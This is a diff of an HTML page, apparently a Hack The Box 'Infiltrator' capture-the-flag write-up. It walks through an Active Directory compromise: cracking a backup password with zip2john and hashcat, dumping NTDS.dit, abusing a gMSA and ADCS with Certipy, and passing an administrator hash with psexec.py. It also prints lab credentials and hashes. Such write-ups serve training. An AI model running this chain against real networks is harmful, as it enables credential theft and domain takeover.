+<p>Armed with the creds, we RDP into Martinez’s box. Like legally? No. But efficiently? Absolutely. Anyway, this zip file’s got a password on it. Of course it does. But we ain’t scared of some password-protected nonsense. We hit it with that <code v-pre>zip2john</code> → <code v-pre>hashcat</code> combo and let RockYou do what RockYou does best.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-none"><code v-pre class="language-none">zip2john BitLocker-backup.7z
-
-hashcat bitlocker.hash $ROCKYOU</code></pre>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ zip2john BitLocker-backup.7z &gt; bitlocker.hash
+$ hashcat bitlocker.hash $ROCKYOU</code></pre>
 </doc-codeblock></div>
 <p>Password? Man, it’s just <code v-pre>zipper</code>. Truly the creativity is off the charts. Inside? The BitLocker recovery key. That’s like finding the keys to someone’s panic room inside their junk drawer.</p>
 <p><figure class="content-center">
@@ -739,8 +740,7 @@ hashcat bitlocker.hash $ROCKYOU</code></pre>
 </figure>
 </p>
 <p>We use that shiny new key to unlock the drive like we’re defusing a bomb in a B-movie, and what do we find?</p>
-<p>Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of <code v-pre>Administrator</code>. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: <code v-pre>NTDS.dit</code> and the registry hives.</p>
-<p>Time to fire up <code v-pre>ntdsdotsqlite</code>, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:</p>
+<p>Oh, just a full Windows Server 2012 backup sittin’ in the Documents folder of <code v-pre>Administrator</code>. You know, just casual enterprise-grade secrets lying around like loose change. And inside that backup? The crown jewel: <code v-pre>NTDS.dit</code> and the registry hives. Time to fire up <code v-pre>ntdsdotsqlite</code>, turn that chunky binary blob into an actual database we can poke at like the gremlins we are:</p>
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ntdsdotsqlite NTDS.DIT --system SYSTEM -o NTDS.sqlite
 
@@ -759,10 +759,10 @@ Head of Development Department</code></pre>
 SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\lan_managment:l@n_M@an!1331</code></pre>
 </doc-codeblock></div>
 <doc-anchor-target id="bloodhound-lan_managment-to-infiltrator_svc">
-    <h3>
+    <h4>
         <doc-anchor-trigger class="header-anchor-trigger" to="#bloodhound-lan_managment-to-infiltrator_svc">#</doc-anchor-trigger>
         <span>Bloodhound LAN_MANAGMENT to INFILTRATOR_SVC</span>
-    </h3>
+    </h4>
 </doc-anchor-target>
 <p>So now that we deep in this bish, rootin&#x27; around like cyber raccoons, we stumble on a shiny lil gem: the gMSA password for <code v-pre>infiltrator_svc$</code>. Yeah, you heard me—<strong>group managed service account</strong> type beat. The kind of account that&#x27;s like, “I rotate my password so you can’t get me,” but guess what? We got you, bozo.</p>
 <p><figure class="content-center">
@@ -786,10 +786,10 @@ infiltrator_svc$:aes128-cts-hmac-sha1-96:4d556ec8ebc73e358d05430c7696f1f0</code>
 <p>One quick decrypt later and boom: password’s sittin’ in plaintext like it paid rent. Now <code v-pre>infiltrator_svc$</code> is ours to command. And with a gMSA under your belt? Bro, you’re not just in the network. <strong>You are</strong> the network.</p>
 <p>Let’s cook.</p>
 <doc-anchor-target id="certipy">
-    <h3>
+    <h4>
         <doc-anchor-trigger class="header-anchor-trigger" to="#certipy">#</doc-anchor-trigger>
         <span>Certipy</span>
-    </h3>
+    </h4>
 </doc-anchor-target>
 <p>We back on the grind and it’s time to hunt some <strong>ADCS</strong> sauce. Fire up that <strong>Certipy</strong> like it’s a radar gun pointed straight at Microsoft’s feelings.</p>
 <div class="codeblock-wrapper"><doc-codeblock>
@@ -848,7 +848,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 <div class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ psexec.py -hashes ':1356f502d2764368302ff0369b1121a1' administrator@10.10.11.31</code></pre>
 </doc-codeblock></div>
-<p>Box rooted. No password reset. No exploit chain. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into <code v-pre>C:\Users\Administrator\Desktop</code>, pop open that <code v-pre>root.txt</code>, and whisper sweet nothings to the final flag.</p>
+<p>Box rooted. Just pure ACL wizardry and a cert with too much ambition. Time to stroll into <code v-pre>C:\Users\Administrator\Desktop</code>, pop open that <code v-pre>root.txt</code>, and whisper sweet nothings to the final flag.</p>
 <p><strong>GG. Game. Over</strong></p>
 
                                 
